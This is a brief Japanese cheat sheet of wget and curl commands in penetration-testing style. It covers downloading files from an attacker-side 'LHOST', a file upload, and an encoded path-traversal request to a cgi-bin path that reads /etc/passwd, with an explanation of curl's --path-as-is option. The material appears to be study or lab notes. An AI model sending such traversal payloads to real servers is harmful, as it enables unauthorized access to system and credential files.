### wget

#### ファイルダウンロード

```bash
wget http://lhost/file
```

### curl

#### ファイルダウンロード

```bash
curl http://<LHOST>/<FILE> > <OUTPUT_FILE>
```
#### ファイルのアップロード
```bash
curl -F "file=@mydocument.pdf" https://example.com/upload
```


```bash
curl -i --path-as-is http://192.168.150.13:443/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
```
- --path-as-is は curl のオプションで、URL のパス部分をそのまま送信するためのものです。
通常、curl はURLエンコードされた文字（例：%2e → .）を自動的にデコードしてから送信しますが、このオプションを使うとそれを無効化できます。